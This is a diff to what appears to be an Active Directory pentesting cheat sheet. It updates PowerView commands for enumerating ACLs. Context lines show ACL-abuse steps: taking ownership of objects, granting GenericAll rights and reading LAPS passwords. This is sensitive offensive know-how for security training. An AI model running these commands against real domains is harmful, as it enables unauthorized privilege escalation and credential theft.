@@ -256,14 +256,14 @@ Start-ACLAnalysis
 ```
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName | Where-Object -Property IdentityreferenceName -Match <USERNAME>
 
-Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"} | select-object ObjectDN, ObjectAceType
+Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"} | select-object ObjectDN, ObjectAceType
 ```
 
-#### Scan for all ACL permissions of the user has on another object
+#### Scan for all ACL permissions of the user has on another specific object
 - First get the SID of the user you want to check if he has permissions on target user
 ```
-Get-Domainuser <USERNAME>
-Get-ObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
+Get-Domainuser <USERNAME> | Select-Object samaccountname, objectsid
+Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
 ```
 
 ### ACL abuses
@@ -314,7 +314,7 @@ Get-DomainObject -Identity <SID>
 
 # Check new rights - First get the SID of the user you want to check if he has permissions on target user
 Get-Domainuser <USERNAME>
-Get-ObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
+Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
 ```
 
 ### Permissions on a group
@@ -383,14 +383,14 @@ Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samacc
 ```
 Set-DomainObjectOwner -Credential $creds -Identity <OBJECT FQDN OR SID> -OwnerIdentity <NEW OWNER>
 
-Get-ObjectAcl -Identity bank-dc.els.bank -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID NEW OWNER>
+Get-DomainObjectAcl -Identity <IDENTITY> -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID NEW OWNER>
 ```
 
 ### Owner of an object - Add GenericAll
 ```
 Add-DomainObjectAcl -Credential $creds -TargetIdentity "<OBJECT FQDN OR SID>" -Rights all -PrincipalIdentity <USER WHO GETS GENERIC ALL> -Verbose
 
-Get-ObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
+Get-DomainObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
 ```
 
 #### NTLMRelay
